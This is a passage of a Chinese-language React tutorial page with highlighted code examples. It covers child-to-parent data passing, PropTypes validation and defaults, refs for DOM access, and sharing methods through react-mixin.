&lt;p&gt;&#123;<span class="keyword">this</span>.state.userName&#125;&lt;<span class="regexp">/p&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.props.userId&#125;&lt;/</span>p&gt;              </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<h2 id="子组件向父组件传递参数"><a href="#子组件向父组件传递参数" class="headerlink" title="子组件向父组件传递参数"></a>子组件向父组件传递参数</h2><p>事件绑定如下：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    render() &#123;</div><div class="line">        <span class="comment">// setTimeout(() =&gt; &#123;</span></div><div class="line">        <span class="comment">//     this.setState(&#123;userName: "Hello"&#125;); //2s后改变 state 的值</span></div><div class="line">        <span class="comment">// &#125;, 2000);</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &lt;input type="button" value="提交" onClick=&#123;this.changeUserInfo.bind(this)&#125; /</span>&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>其中<code>onClick={this.changeUserInfo.bind(this)}</code>是在调用时绑定this,可以使用ES6语法，如<code>onClick={() =&gt; this.changeUserInfo()}</code>。也可以直接在构造函数constructor里绑定this，<code>this.changeUserInfo = this.changeUserInfo.bind(this);</code>。</p>
<p><strong>子组件向父组件传递数据：</strong> 只能通过事件的形式，从子组件向父组件传递数据。通过在父组件中事先定义好处理子组件事件的函数，并且以props属性的形式，将该事件处理函数传递给子组件，从而实现子组件向父组件传递数据。</p>
<p>例如在<code>&lt;Body/&gt;</code>组件中添加子组件<code>&lt;BodyChild/&gt;</code>，并且事先定义好了子组件在输入值改变时的事件处理函数<code>handleChildValueChange(event)</code>，以子组件属性的形式(<code>&lt;BodyChild handleChildValueChange={this.handleChildValueChange.bind(this)}/&gt;</code>)将该事件处理函数传递给子组件，从而实现从子组件<code>&lt;BodyChild/&gt;</code>向父组件<code>&lt;Body/&gt;</code>传递数据。</p>
<p>父组件<code>&lt;Body/&gt;</code>:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; <span class="comment">//通过事件形式，获取子组件的数据</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &lt;input type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /</span>&gt;</div><div class="line">                &#123;<span class="comment">/* BodyChild 子组件 */</span>&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;<span class="keyword">this</span>.handleChildValueChange.bind(<span class="keyword">this</span>)&#125;/&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>子组件<code>&lt;BodyChild/&gt;</code>:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BodyChild</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;p&gt;子页面输入:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">onChange</span>=<span class="string">&#123;this.props.handleChildValueChange&#125;/</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>这样当子组件文本输入框内的值改变时，会实时反映到父组件的<code>&lt;p&gt;{this.state.userName}&lt;/p&gt;</code>区域。</p>
<h2 id="props属性校验"><a href="#props属性校验" class="headerlink" title="props属性校验"></a>props属性校验</h2><p>props是一个组件对外暴露的接口，React提供了PropTypes对象，用于校验组件属性的类型。<br>以Body组件为例，当类定义完之后，可以通过<code>Body.propTypes</code>形式，限定Body组件属性值的类型。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos;;</div><div class="line">import PropTypes from &apos;prop-types&apos;;</div><div class="line">import BodyChild from &apos;./bodyChild&apos;;</div><div class="line"></div><div class="line"></div><div class="line">class Body extends Component &#123;</div><div class="line">    constructor() &#123;</div><div class="line">        super(); //调用基类的所有初始化方法</div><div class="line">        this.state = &#123;userName: &quot;Shirley&quot;&#125;; //初始化赋值</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        this.setState(&#123;userName: &quot;Your name has changed!&quot;&#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据</div><div class="line">        this.setState(&#123;userName: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        return (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;/h2&gt;</div><div class="line">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt;</div><div class="line">                &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125;</div><div class="line">                &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; </div><div class="line">                &lt;input type=&quot;button&quot; value=&quot;提交&quot; onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt;</div><div class="line">                &#123;/* BodyChild 子组件 */&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt;             </div><div class="line">            &lt;/div&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// Body组件props属性校验</div><div class="line">Body.propTypes = &#123;</div><div class="line">    userId: PropTypes.number</div><div class="line">&#125;;</div><div class="line"></div><div class="line">export default Body;</div></pre></td></tr></table></figure></p>
<p>当在Body父组件App中，通过props传递一个字符串给Body组件的userId属性，会报错：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> ComponentHeader <span class="keyword">from</span> <span class="string">'./header'</span>;</div><div class="line"><span class="keyword">import</span> ComponentFooter <span class="keyword">from</span> <span class="string">'./footer'</span>;</div><div class="line"><span class="keyword">import</span> Body <span class="keyword">from</span> <span class="string">'./body'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123; </div><div class="line"></div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">        &lt;ComponentHeader /&gt;</div><div class="line">        &#123;<span class="comment">/* Body组件通过 PropTypes对象校验uesrId的类型必须为Number类型 */</span>&#125;</div><div class="line">        &lt;Body userId=&#123;<span class="string">"hello"</span>&#125; /&gt;</div><div class="line">        &lt;ComponentFooter /&gt;</div><div class="line">      &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">    );</span></div><div class="line"><span class="regexp">  &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp">export default App;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/%E5%B1%9E%E6%80%A7%E7%B1%BB%E5%9E%8B%E6%A0%A1%E9%AA%8C.png" alt="props类型校验"></p>
<p><strong>为组件属性指定默认值：</strong> 当组件属性未被赋值时，组件会使用defaultProps定义的默认属性。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Body.defaultProps = &#123;</div><div class="line">    userId: <span class="number">123</span></div><div class="line">&#125;;</div><div class="line"><span class="comment">//或在组件头部定义</span></div><div class="line"><span class="keyword">const</span> defaultProps = &#123;</div><div class="line">    userId: <span class="number">123</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p><strong>传递当前组件的所有props参数的快捷方式：</strong> 利用<code>...</code>展开运算符。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;Body &#123;...this.props&#125; more=<span class="string">"values"</span> /&gt;</div></pre></td></tr></table></figure></p>
<h2 id="组件的Refs"><a href="#组件的Refs" class="headerlink" title="组件的Refs"></a>组件的Refs</h2><p>Refs主要用来获取纯 HTML DOM节点，例如对<code>&lt;input&gt;</code>标签作focus处理，文本的选择等需要操作真实DOM的地方。绝大多数场景下，应该避免使用ref，因为它破坏了React中以props为数据传递介质的典型数据流。</p>
<p>第一种在React中操作真实DOM的方法如下，就像在原生js中操作DOM元素一样：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line"><span class="keyword">import</span> BodyChild <span class="keyword">from</span> <span class="string">'./bodyChild'</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">        <span class="comment">// 第一种方式操作DOM</span></div><div class="line">        <span class="keyword">var</span> submitBtn = <span class="built_in">document</span>.getElementById(<span class="string">"submitBtn"</span>);</div><div class="line">        ReactDOM.findDOMNode(submitBtn).style.color = <span class="string">'red'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; <span class="comment">//通过事件形式，获取子组件的数据</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &#123;<span class="comment">/* 通过 PropTypes 对象校验uesrId的类型 */</span>&#125;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &#123;/</span>* 操作真实DOM *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">                &lt;input id="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /</span>&gt;</div><div class="line">                &#123;<span class="comment">/* BodyChild 子组件 */</span>&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;<span class="keyword">this</span>.handleChildValueChange.bind(<span class="keyword">this</span>)&#125;/&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p>第二种通过ref属性操作真实DOM，该方式更接近React的思维，推荐使用此方式进行必要的DOM操作：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</div><div class="line"><span class="comment">// import ReactDOM from 'react-dom';</span></div><div class="line"><span class="keyword">import</span> BodyChild <span class="keyword">from</span> <span class="string">'./bodyChild'</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">        <span class="comment">// 第一种方式操作真实DOM</span></div><div class="line">        <span class="comment">// var submitBtn = document.getElementById("submitBtn");</span></div><div class="line">        <span class="comment">// ReactDOM.findDOMNode(submitBtn).style.color = 'red';</span></div><div class="line"></div><div class="line">        <span class="comment">// 第二种方式操作真实DOM</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.refs.submitBtn);</div><div class="line">        <span class="keyword">this</span>.refs.submitBtn.style.color = <span class="string">'red'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; <span class="comment">//通过事件形式，获取子组件的数据</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &#123;<span class="comment">/* 通过 PropTypes 对象校验uesrId的类型 */</span>&#125;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &#123;/</span>* 操作真实DOM *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">                &lt;input id="submitBtn" ref="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /</span>&gt;</div><div class="line">                &#123;<span class="comment">/* BodyChild 子组件 */</span>&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;<span class="keyword">this</span>.handleChildValueChange.bind(<span class="keyword">this</span>)&#125;/&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div></pre></td></tr></table></figure></p>
<p><code>console.log(this.refs.submitBtn)</code>结果：<br><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/ref%E6%93%8D%E4%BD%9CDOM.png" alt="ref操作DOM"><br><strong>Refs特点：</strong><br>Refs是访问到组件内部DOM节点唯一可靠的方法。<br>Refs会自动销毁对子组件的引用，即如果子组件被销毁，它的引用也会被销毁，从而不必担心内存问题。<br>不要在render或render之前对ref进行引用，因为此时组件未渲染，组件内的DOM元素未加载，访问不到。<br>只能为类组件定义ref属性，不能为函数组件定义ref属性。<br>不要滥用Refs，尽量使用state和props维护UI。</p>
<h2 id="独立组件间共享Mixin"><a href="#独立组件间共享Mixin" class="headerlink" title="独立组件间共享Mixin"></a>独立组件间共享Mixin</h2><p>在ES6中使用mixin需要使用插件<code>react-mixin</code>。<br>通过Mixins共享组件间的一些方法。例如新建一个src\components\mixins.js文件，里面定义组件间共享的一些方法，如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> MixinLog = &#123;</div><div class="line">    log() &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"You are using Mixin."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> MixinLog;</div></pre></td></tr></table></figure></p>
<p>首先安装一下react-mixin: <code>npm install --save react-mixin@2</code>。在需要使用mixin共享方法的文件中，导入<code>react-mixin</code>安装包，以及引入共享方法所在的文件mixins.js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> ReactMixin <span class="keyword">from</span> <span class="string">'react-mixin'</span>;</div><div class="line"><span class="keyword">import</span> MixinLog <span class="keyword">from</span> <span class="string">'./mixins'</span>;</div></pre></td></tr></table></figure></p>
<p>然后将引入的共享文件导出对象赋值给组件的prototype对象，如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 组件间共享 Mixin</span></div><div class="line">ReactMixin(Body.prototype, MixinLog);</div></pre></td></tr></table></figure></p>
<p>接下来，就可以在需要使用共享方法的地方使用引入的共享对象中的方法：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</div><div class="line"><span class="comment">// import ReactDOM from 'react-dom';</span></div><div class="line"><span class="keyword">import</span> BodyChild <span class="keyword">from</span> <span class="string">'./bodyChild'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> ReactMixin <span class="keyword">from</span> <span class="string">'react-mixin'</span>;</div><div class="line"><span class="keyword">import</span> MixinLog <span class="keyword">from</span> <span class="string">'./mixins'</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">        <span class="comment">// 第一种方式操作真实DOM</span></div><div class="line">        <span class="comment">// var submitBtn = document.getElementById("submitBtn");</span></div><div class="line">        <span class="comment">// ReactDOM.findDOMNode(submitBtn).style.color = 'red';</span></div><div class="line"></div><div class="line">        <span class="comment">// 第二种方式操作真实DOM</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.refs.submitBtn);</div><div class="line">        <span class="keyword">this</span>.refs.submitBtn.style.color = <span class="string">'red'</span>;</div><div class="line"></div><div class="line">        <span class="comment">// 使用Mixin共享方法log()</span></div><div class="line">        MixinLog.log();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; <span class="comment">//通过事件形式，获取子组件的数据</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &#123;<span class="comment">/* 通过 PropTypes 对象校验uesrId的类型 */</span>&#125;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &#123;/</span>* 操作真实DOM *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">                &lt;input id="submitBtn" ref="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /</span>&gt;</div><div class="line">                &#123;<span class="comment">/* BodyChild 子组件 */</span>&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;<span class="keyword">this</span>.handleChildValueChange.bind(<span class="keyword">this</span>)&#125;/&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">/</span><span class="regexp">/ Body组件props属性校验</span></div><div class="line"><span class="regexp">Body.propTypes = &#123;</span></div><div class="line"><span class="regexp">    userId: PropTypes.number</span></div><div class="line"><span class="regexp">&#125;;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">/</span><span class="regexp">/ 组件间共享 Mixin</span></div><div class="line"><span class="regexp">ReactMixin(Body.prototype, MixinLog);</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">export default Body;</span></div></pre></td></tr></table></figure></p>
